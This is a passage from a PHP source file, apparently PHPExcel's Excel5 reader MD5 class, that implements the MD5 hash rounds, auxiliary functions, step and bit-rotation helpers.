     * @return string
     */
    public function getContext()
    {
        $s = '';
        foreach (array('a', 'b', 'c', 'd') as $i) {
            $v = $this->{$i};
            $s .= chr($v & 0xff);
            $s .= chr(($v >> 8) & 0xff);
            $s .= chr(($v >> 16) & 0xff);
            $s .= chr(($v >> 24) & 0xff);
        }

        return $s;
    }

    /**
     * Add data to context
     *
     * @param string $data Data to add
     */
    public function add($data)
    {
        $words = array_values(unpack('V16', $data));

        $A = $this->a;
        $B = $this->b;
        $C = $this->c;
        $D = $this->d;

        $F = array('PHPExcel_Reader_Excel5_MD5','f');
        $G = array('PHPExcel_Reader_Excel5_MD5','g');
        $H = array('PHPExcel_Reader_Excel5_MD5','h');
        $I = array('PHPExcel_Reader_Excel5_MD5','i');

        /* ROUND 1 */
        self::step($F, $A, $B, $C, $D, $words[0], 7, 0xd76aa478);
        self::step($F, $D, $A, $B, $C, $words[1], 12, 0xe8c7b756);
        self::step($F, $C, $D, $A, $B, $words[2], 17, 0x242070db);
        self::step($F, $B, $C, $D, $A, $words[3], 22, 0xc1bdceee);
        self::step($F, $A, $B, $C, $D, $words[4], 7, 0xf57c0faf);
        self::step($F, $D, $A, $B, $C, $words[5], 12, 0x4787c62a);
        self::step($F, $C, $D, $A, $B, $words[6], 17, 0xa8304613);
        self::step($F, $B, $C, $D, $A, $words[7], 22, 0xfd469501);
        self::step($F, $A, $B, $C, $D, $words[8], 7, 0x698098d8);
        self::step($F, $D, $A, $B, $C, $words[9], 12, 0x8b44f7af);
        self::step($F, $C, $D, $A, $B, $words[10], 17, 0xffff5bb1);
        self::step($F, $B, $C, $D, $A, $words[11], 22, 0x895cd7be);
        self::step($F, $A, $B, $C, $D, $words[12], 7, 0x6b901122);
        self::step($F, $D, $A, $B, $C, $words[13], 12, 0xfd987193);
        self::step($F, $C, $D, $A, $B, $words[14], 17, 0xa679438e);
        self::step($F, $B, $C, $D, $A, $words[15], 22, 0x49b40821);

        /* ROUND 2 */
        self::step($G, $A, $B, $C, $D, $words[1], 5, 0xf61e2562);
        self::step($G, $D, $A, $B, $C, $words[6], 9, 0xc040b340);
        self::step($G, $C, $D, $A, $B, $words[11], 14, 0x265e5a51);
        self::step($G, $B, $C, $D, $A, $words[0], 20, 0xe9b6c7aa);
        self::step($G, $A, $B, $C, $D, $words[5], 5, 0xd62f105d);
        self::step($G, $D, $A, $B, $C, $words[10], 9, 0x02441453);
        self::step($G, $C, $D, $A, $B, $words[15], 14, 0xd8a1e681);
        self::step($G, $B, $C, $D, $A, $words[4], 20, 0xe7d3fbc8);
        self::step($G, $A, $B, $C, $D, $words[9], 5, 0x21e1cde6);
        self::step($G, $D, $A, $B, $C, $words[14], 9, 0xc33707d6);
        self::step($G, $C, $D, $A, $B, $words[3], 14, 0xf4d50d87);
        self::step($G, $B, $C, $D, $A, $words[8], 20, 0x455a14ed);
        self::step($G, $A, $B, $C, $D, $words[13], 5, 0xa9e3e905);
        self::step($G, $D, $A, $B, $C, $words[2], 9, 0xfcefa3f8);
        self::step($G, $C, $D, $A, $B, $words[7], 14, 0x676f02d9);
        self::step($G, $B, $C, $D, $A, $words[12], 20, 0x8d2a4c8a);

        /* ROUND 3 */
        self::step($H, $A, $B, $C, $D, $words[5], 4, 0xfffa3942);
        self::step($H, $D, $A, $B, $C, $words[8], 11, 0x8771f681);
        self::step($H, $C, $D, $A, $B, $words[11], 16, 0x6d9d6122);
        self::step($H, $B, $C, $D, $A, $words[14], 23, 0xfde5380c);
        self::step($H, $A, $B, $C, $D, $words[1], 4, 0xa4beea44);
        self::step($H, $D, $A, $B, $C, $words[4], 11, 0x4bdecfa9);
        self::step($H, $C, $D, $A, $B, $words[7], 16, 0xf6bb4b60);
        self::step($H, $B, $C, $D, $A, $words[10], 23, 0xbebfbc70);
        self::step($H, $A, $B, $C, $D, $words[13], 4, 0x289b7ec6);
        self::step($H, $D, $A, $B, $C, $words[0], 11, 0xeaa127fa);
        self::step($H, $C, $D, $A, $B, $words[3], 16, 0xd4ef3085);
        self::step($H, $B, $C, $D, $A, $words[6], 23, 0x04881d05);
        self::step($H, $A, $B, $C, $D, $words[9], 4, 0xd9d4d039);
        self::step($H, $D, $A, $B, $C, $words[12], 11, 0xe6db99e5);
        self::step($H, $C, $D, $A, $B, $words[15], 16, 0x1fa27cf8);
        self::step($H, $B, $C, $D, $A, $words[2], 23, 0xc4ac5665);

        /* ROUND 4 */
        self::step($I, $A, $B, $C, $D, $words[0], 6, 0xf4292244);
        self::step($I, $D, $A, $B, $C, $words[7], 10, 0x432aff97);
        self::step($I, $C, $D, $A, $B, $words[14], 15, 0xab9423a7);
        self::step($I, $B, $C, $D, $A, $words[5], 21, 0xfc93a039);
        self::step($I, $A, $B, $C, $D, $words[12], 6, 0x655b59c3);
        self::step($I, $D, $A, $B, $C, $words[3], 10, 0x8f0ccc92);
        self::step($I, $C, $D, $A, $B, $words[10], 15, 0xffeff47d);
        self::step($I, $B, $C, $D, $A, $words[1], 21, 0x85845dd1);
        self::step($I, $A, $B, $C, $D, $words[8], 6, 0x6fa87e4f);
        self::step($I, $D, $A, $B, $C, $words[15], 10, 0xfe2ce6e0);
        self::step($I, $C, $D, $A, $B, $words[6], 15, 0xa3014314);
        self::step($I, $B, $C, $D, $A, $words[13], 21, 0x4e0811a1);
        self::step($I, $A, $B, $C, $D, $words[4], 6, 0xf7537e82);
        self::step($I, $D, $A, $B, $C, $words[11], 10, 0xbd3af235);
        self::step($I, $C, $D, $A, $B, $words[2], 15, 0x2ad7d2bb);
        self::step($I, $B, $C, $D, $A, $words[9], 21, 0xeb86d391);

        $this->a = ($this->a + $A) & 0xffffffff;
        $this->b = ($this->b + $B) & 0xffffffff;
        $this->c = ($this->c + $C) & 0xffffffff;
        $this->d = ($this->d + $D) & 0xffffffff;
    }

    private static function f($X, $Y, $Z)
    {
        return (($X & $Y) | ((~ $X) & $Z)); // X AND Y OR NOT X AND Z
    }

    private static function g($X, $Y, $Z)
    {
        return (($X & $Z) | ($Y & (~ $Z))); // X AND Z OR Y AND NOT Z
    }

    private static function h($X, $Y, $Z)
    {
        return ($X ^ $Y ^ $Z); // X XOR Y XOR Z
    }

    private static function i($X, $Y, $Z)
    {
        return ($Y ^ ($X | (~ $Z))) ; // Y XOR (X OR NOT Z)
    }

    private static function step($func, &$A, $B, $C, $D, $M, $s, $t)
    {
        $A = ($A + call_user_func($func, $B, $C, $D) + $M + $t) & 0xffffffff;
        $A = self::rotate($A, $s);
        $A = ($B + $A) & 0xffffffff;
    }

    private static function rotate($decimal, $bits)
    {
        $binary = str_pad(decbin($decimal), 32, "0", STR_PAD_LEFT);
        return bindec(substr($binary, $bits).substr($binary, 0, $bits));
    }
}
